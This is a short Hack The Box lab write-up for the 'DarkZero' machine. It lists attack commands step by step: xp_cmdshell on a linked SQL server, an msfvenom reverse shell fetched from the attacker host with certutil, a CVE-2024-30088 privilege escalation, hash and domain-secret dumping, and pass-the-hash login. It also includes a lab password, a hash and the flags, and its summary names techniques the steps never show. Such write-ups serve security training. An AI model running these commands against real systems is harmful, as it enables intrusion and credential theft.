# Hack The Box — DarkZero (Hard) — Short Writeup

**Goal:** Capture user & root flags. Keep explanations very short and to-the-point.

---

## TL;DR
- Found linked SQL servers and used xp_cmdshell to get shell.
- Uploaded reverse shell, got meterpreter as svc_sql.
- Exploited CVE-2024-30088 for SYSTEM.
- Collected krbtgt/NTDS secrets and used kerberoast/AS-REP/GoldenTicket techniques.
- Validated with Evil-WinRM using dumped Administrator hash.

---

## Notes / Conventions
- Commands are shown in code blocks.
- Between code blocks: extremely short explanation (5–15 words).

---

## Recon + Host mapping

```bash
echo "10.129.26.13 DC01.darkzero.htb DC01 darkzero.htb" >> sudo tee -a /etc/hosts
```
Quick host mapping for domain name resolution.

---

## SQL Auth & Linked Server discovery

```text
impacket-mssqlclient john.w@dc01.darkzero.htb -windows-auth
```
Authenticate to MSSQL using Windows auth.

```sql
-- inside impacket-mssqlclient
enum_links
```
Enumerated linked servers and found DC02 link.

---

## Enable xp_cmdshell on linked server + command execution

```sql
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "whoami"') AT [DC02.darkzero.ext]
```
Enabled xp_cmdshell and verified remote identity.

---

## Prepare and serve reverse shell

```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.73 LPORT=9999 -f exe -o reverse.exe
python3 -m http.server 8000
```
Build payload and host it via HTTP for download.

```sql
EXEC ('xp_cmdshell "certutil -urlcache -f http://10.10.14.73:8000/reverse.exe C:\Users\Public\reverse.exe"') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "C:\Users\Public\reverse.exe"') AT [DC02.darkzero.ext]
```
Download and execute payload on target via xp_cmdshell.

```text
msfconsole: set up handler, run
```
Start Metasploit handler and accept incoming session.

---

## Meterpreter shell as svc_sql

```text
meterpreter > shell
whoami -> darkzero-ext\svc_sql
```
Interactive shell shows svc_sql user context.

---

## Local Privilege Escalation (CVE-2024-30088)

```text
msf > search cve 2024 30088
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION 4
set LHOST 10.10.14.73
run
```
Run public kernel LPE exploit to escalate to SYSTEM.

```text
whoami -> nt authority\system
```
Confirmed SYSTEM via whoami after exploit.

---

## Grab user flag

```text
cd C:\Users\Administrator\Desktop
type user.txt
```
Read user flag from Administrator desktop.

---

## Dump NT hashes & domain secrets

```text
meterpreter > hashdump
```
Dumped local/domain hashes available on compromised host.

---

## Use Rubeus for TGT monitoring

```text
upload Rubeus.exe to C:\Windows\Temp
.\Rubeus.exe monitor /interval:5 /nowrap
```
Monitor for new Kerberos TGTs (observed machine TGTs).

---

## Coerce / EFSRPC / SMB abuse

```text
coercer coerce -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -l DC02.darkzero.ext -t 10.129.26.13
```
Trigger DCERPC/coerce functions to generate tickets or actions.

---

## Extracted kirbi ticket -> convert to ccache

```bash
# save base64 kirbi to file and decode
echo "<BASE64_KIRBI>" | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
```
Converted captured kirbi into a usable ccache file.

---

## DRSUAPI secretsdump using ticket

```text
impacket-secretsdump -k -no-pass -just-dc DC01.darkzero.htb
```
Dumped domain credentials and Kerberos keys via DRSUAPI.

---

## Use dumped Administrator NT hash with Evil-WinRM

```text
evil-winrm -i 10.129.26.13 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```
Authenticated to host with Administrator hash via WinRM.

```powershell
cd ..\Desktop
ls
type root.txt
```
Collected both root and user flags from Desktop.

---

## Flags
- user.txt: `19f415c90328323faadefef19c539ab3`
- root.txt: `939854ef74759c980480429f6df91139`

---

## Tools used
- Impacket (mssqlclient, ticketConverter, secretsdump)
- Metasploit (msfvenom, msfconsole exploits/handlers)
- certutil (file download on target)
- Rubeus (Kerberos automation)
- coercer (coerce/efsrpc abuse)
- Evil-WinRM (post-auth shell)

---

## Final notes
- All actions shown were concise and sequential.
- Replace any hardcoded IPs/creds when reproducing in different lab.

---

*Writeup intentionally terse — focused on commands and outcomes.*

